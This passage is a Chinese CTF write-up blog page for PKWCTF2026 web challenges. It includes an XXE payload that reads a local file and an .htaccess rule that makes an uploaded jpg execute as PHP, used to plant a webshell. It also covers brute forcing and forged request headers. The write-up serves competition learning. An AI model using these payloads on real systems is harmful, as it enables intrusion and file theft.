@@ -1,0 +1,1264 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Y.png">
+  <link rel="icon" href="/img/Y.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Colourful">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="WEB纸上谈兵xml语句，感觉像是XXE，尝试写一个DTD，利用file协议读取文件  payload 12345&lt;!DOCTYPE admin [&lt;!ENTITY ben SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;register&gt;    &lt;name&gt;admin&lt;&#x2F;name&gt;    &lt;phone&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PKWCTF2026-WP">
+<meta property="og:url" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/index.html">
+<meta property="og:site_name" content="Colourful">
+<meta property="og:description" content="WEB纸上谈兵xml语句，感觉像是XXE，尝试写一个DTD，利用file协议读取文件  payload 12345&lt;!DOCTYPE admin [&lt;!ENTITY ben SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;register&gt;    &lt;name&gt;admin&lt;&#x2F;name&gt;    &lt;phone&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920121729021.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920121844754.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920122314319.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920122431222.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920122517554.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920122930855.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920122828585.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920123350042.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920123331827.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920123507592.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920124340005.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920124418469.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920125345129.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920130258890.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920131350478.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920131503230.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920131652753.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920131727367.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921163542110.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921163509401.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921163757483.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921163938031.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921164046199.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921164732890.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921164858705.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921165103409.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921165209523.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921164656506.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921165327839.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921165644491.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921165840891.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921165912808.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921191624539.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921192037442.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921192206772.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921193819525.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921193844012.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921194529314.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921194655510.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921194745102.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921194838829.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921195015042.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921195113452.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921195816024.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921195905417.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921200048299.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921200258843.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921200415066.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921200534980.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921200655600.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260922122448275.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921201856307.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921202023573.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921202121880.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260921202223042.png">
+<meta property="article:published_time" content="2026-09-20T04:15:27.000Z">
+<meta property="article:modified_time" content="2026-09-22T05:56:39.487Z">
+<meta property="article:author" content="Colourful">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/image-20260920121729021.png">
+<meta name="twitter:creator" content="@Colourful">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>PKWCTF2026-WP - Colourful</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"colourful228.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2026-01-09T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Colourful的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/posts/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+
+
+
+<div id="banner" class="banner" parallax=true
+     style="background: none; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PKWCTF2026-WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Colourful
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-20 12:15" pubdate>
+          2026年9月20日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<style>
+  /* 有视频的页面：全局背景层只保留视频，彻底移除静态背景图 */
+  #web_bg {
+    overflow: hidden;
+    background-image: none !important;
+  }
+
+  /* 视频全屏铺满整个页面（覆盖原静态背景位置） */
+  #web_bg video.banner-video {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    min-width: 100%;
+    min-height: 100%;
+    object-fit: cover;
+    z-index: 0;
+    opacity: 0;
+    transition: opacity 1.2s ease;
+  }
+
+  #web_bg video.banner-video.banner-video-ready {
+    opacity: 1;
+  }
+
+  /* 用户偏好减少动态效果时不播放视频，但也保持全屏、不露出静态图 */
+  @media (prefers-reduced-motion: reduce) {
+    #web_bg video.banner-video {
+      display: none;
+    }
+  }
+</style>
+<script>
+  (function () {
+    function injectBannerVideo() {
+      var webBg = document.getElementById("web_bg");
+      if (!webBg || webBg.querySelector("video.banner-video")) return;
+
+      // 移除静态背景图（backgroundize.js 会把它写成内联样式），只留视频
+      webBg.style.backgroundImage = "none";
+
+      var video = document.createElement("video");
+      video.className = "banner-video";
+      video.src = "/video/comment.mp4";
+      video.loop = true;
+      video.muted = true;       // 静音才能自动播放
+      video.autoplay = true;
+      video.setAttribute("playsinline", "");
+      video.setAttribute("preload", "auto");
+      video.setAttribute("aria-hidden", "true");
+
+      // 可以播放时淡入
+      video.addEventListener("canplay", function () {
+        video.classList.add("banner-video-ready");
+        var p = video.play();
+        if (p && p.catch) p.catch(function () {});
+      });
+
+      webBg.appendChild(video);
+    }
+
+    // 等待 load，确保 backgroundize.js 已先完成对 #web_bg 的处理，再覆盖为视频
+    if (document.readyState === "complete") {
+      injectBannerVideo();
+    } else {
+      window.addEventListener("load", injectBannerVideo);
+    }
+  })();
+</script>
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PKWCTF2026-WP</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-09-22T13:56:39+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="纸上谈兵"><a href="#纸上谈兵" class="headerlink" title="纸上谈兵"></a>纸上谈兵</h2><p>xml语句，感觉像是XXE，尝试写一个DTD，利用file协议读取文件</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920121729021.png" srcset="/img/loading.gif" lazyload alt="image-20260920121729021"></p>
+<p>payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">register</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span><span class="hljs-symbol">&amp;ben;</span><span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">register</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920121844754.png" srcset="/img/loading.gif" lazyload alt="image-20260920121844754"></p>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>利用ctrl+u想要查看源码，但是发现快捷键被禁用了</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920122314319.png" srcset="/img/loading.gif" lazyload alt="image-20260920122314319"></p>
+<p>那就利用f12查看源码</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920122431222.png" srcset="/img/loading.gif" lazyload alt="image-20260920122431222"></p>
+<p>在这里可以看到base64加密的flag解密一下就是flag，其实在控制台就可以直接看到一个flag，但是这个flag是假的</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920122517554.png" srcset="/img/loading.gif" lazyload alt="image-20260920122517554"></p>
+<p>或者直接在URL前加上<code>view-source:</code>，就可以看到完整源码</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920122930855.png" srcset="/img/loading.gif" lazyload alt="image-20260920122930855"></p>
+<p>那就对上一个base64密文解密</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920122828585.png" srcset="/img/loading.gif" lazyload alt="image-20260920122828585"></p>
+<h2 id="mio"><a href="#mio" class="headerlink" title="mio"></a>mio</h2><p>提示密码被藏起来了</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920123350042.png" srcset="/img/loading.gif" lazyload alt="image-20260920123350042"></p>
+<p>就尝试一些比较常见的源码泄露看看能不能把源码下载下来，发现<a target="_blank" rel="noopener" href="http://www.zip可以下载到/">www.zip可以下载到</a></p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920123331827.png" srcset="/img/loading.gif" lazyload alt="image-20260920123331827"></p>
+<p>解压缩得到了一份字典</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920123507592.png" srcset="/img/loading.gif" lazyload alt="image-20260920123507592"></p>
+<p>然后放到bp中抓包攻击</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920124340005.png" srcset="/img/loading.gif" lazyload alt="image-20260920124340005"></p>
+<p>一开始全返回了302我以为失败了，但是当我把拦截关闭了之后，发现已经出flag，但是密码还不清楚是哪一个，没搞明白出题人是想考什么，只是用bp爆破的过程吗（不管会爆破会信息收集就行，至少出flag了</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920124418469.png" srcset="/img/loading.gif" lazyload alt="image-20260920124418469"></p>
+<h2 id="mio上传"><a href="#mio上传" class="headerlink" title="mio上传"></a>mio上传</h2><p>一道简单的文件上传，php貌似被完全过滤了</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920125345129.png" srcset="/img/loading.gif" lazyload alt="image-20260920125345129"></p>
+<p>看到是Apache服务，就可以利用.htaccess配置文件</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920130258890.png" srcset="/img/loading.gif" lazyload alt="image-20260920130258890"></p>
+<p>原理就是cmd.jpg的内容解析为php代码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;cmd.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920131350478.png" srcset="/img/loading.gif" lazyload alt="image-20260920131350478"></p>
+<p>然后再上传一句话木马，显示上传成功可以看到上传路径，利用蚁剑连接</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920131503230.png" srcset="/img/loading.gif" lazyload alt="image-20260920131503230"></p>
+<p>连接成功可以直接读到flag</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920131652753.png" srcset="/img/loading.gif" lazyload alt="image-20260920131652753"></p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260920131727367.png" srcset="/img/loading.gif" lazyload alt="image-20260920131727367"></p>
+<h2 id="probe"><a href="#probe" class="headerlink" title="probe"></a>probe</h2><p>打开网站看到说GET方法不可以，就尝试抓包</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921163542110.png" srcset="/img/loading.gif" lazyload alt="image-20260921163542110"></p>
+<p>在bp中可以看到有<code>Step 2: PUT</code>的提示，利用PUT方法</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921163509401.png" srcset="/img/loading.gif" lazyload alt="image-20260921163509401"></p>
+<p>只需要将请求方法手动改成PUT，看到Step3是用POST传参，路径是<code>/probe</code>，根据Hint添加<code>X-Pkw-Auth: iamadmin</code></p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921163757483.png" srcset="/img/loading.gif" lazyload alt="image-20260921163757483"></p>
+<p>下一步就是考察的添加Cookie值</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921163938031.png" srcset="/img/loading.gif" lazyload alt="image-20260921163938031"></p>
+<p>添加Cookie头，发包就可以得到flag</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921164046199.png" srcset="/img/loading.gif" lazyload alt="image-20260921164046199"></p>
+<h2 id="元素属性"><a href="#元素属性" class="headerlink" title="元素属性"></a>元素属性</h2><p>先用<code>ctrl+u</code>看一下前端源码，只能看到比较有用的就是<code>/static/app.js</code>，暴露了一些路由和传参方式</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921164732890.png" srcset="/img/loading.gif" lazyload alt="image-20260921164732890"></p>
+<p>简单审计一下，先找一下存在的路由接口</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921164858705.png" srcset="/img/loading.gif" lazyload alt="image-20260921164858705"></p>
+<table>
+<thead>
+<tr>
+<th>路由</th>
+<th>请求方法</th>
+<th>用途</th>
+<th>关联逻辑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/api/session</code></td>
+<td>GET</td>
+<td>检查当前会话登录状态，判断是否直接进入加密文件库</td>
+<td><code>boot()</code>初始化时调用，返回<code>authenticated</code>字段，为<code>true</code>则跳过登录直接加载文件列表</td>
+</tr>
+<tr>
+<td><code>/api/login</code></td>
+<td>POST</td>
+<td>处理用户登录认证，验证账号密码合法性</td>
+<td>登录表单提交时调用，接收<code>username</code>+<code>password</code>的JSON参数，返回<code>ok</code>字段标识认证结果，失败则返回拒绝原因</td>
+</tr>
+<tr>
+<td><code>/api/logout</code></td>
+<td>POST</td>
+<td>销毁当前登录会话，退出系统</td>
+<td>点击退出按钮时调用，无额外参数，退出后清空本地文件状态、重置UI到登录页</td>
+</tr>
+<tr>
+<td><code>/api/files</code></td>
+<td>GET</td>
+<td>获取当前用户有权查看的文件列表元数据</td>
+<td>登录成功后<code>enterVault()</code>调用，返回文件数组，包含<code>id</code>&#x2F;<code>name</code>&#x2F;<code>label</code>&#x2F;<code>description</code>&#x2F;<code>accent</code>&#x2F;<code>disabled</code>等字段，用于渲染文件卡片列表</td>
+</tr>
+<tr>
+<td><code>/api/files/:fileId</code></td>
+<td>GET</td>
+<td>获取指定ID文件的完整内容</td>
+<td>点击文件卡片的「OPEN」按钮时调用，返回文件的<code>name</code>和<code>content</code>字段，渲染到右侧文件查看器</td>
+</tr>
+</tbody></table>
+<p>但是首先需要在首页进行登录</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921165103409.png" srcset="/img/loading.gif" lazyload alt="image-20260921165103409"></p>
+<p>一开始尝试了爆破，但是没有命中，就想到了信息收集，看一下爬虫协议</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921165209523.png" srcset="/img/loading.gif" lazyload alt="image-20260921165209523"></p>
+<p>继续去访问这个给出的路径，发现直接给了账号密码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adminroot</span>/<span class="hljs-number">112233</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921164656506.png" srcset="/img/loading.gif" lazyload alt="image-20260921164656506"></p>
+<p>登录成功，先查看flag.txt文件，发现是一个提示：“怎么查看不了f14g文件哇，你知道js里的一个dom元素属性嘛？似乎他可以改变这一切”，我们可以看到f14g文件的按钮失效了</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921165327839.png" srcset="/img/loading.gif" lazyload alt="image-20260921165327839"></p>
+<p>利用f12开发者工具，在“元素”中，利用左上角的可以定位到失效按钮的地方</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921165644491.png" srcset="/img/loading.gif" lazyload alt="image-20260921165644491"></p>
+<p>将<code>disabled</code>删去，回车</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921165840891.png" srcset="/img/loading.gif" lazyload alt="image-20260921165840891"></p>
+<p>再看到我们的页面，f14g的按钮就不是灰色的了，可以点击了直接获得flag</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921165912808.png" srcset="/img/loading.gif" lazyload alt="image-20260921165912808"></p>
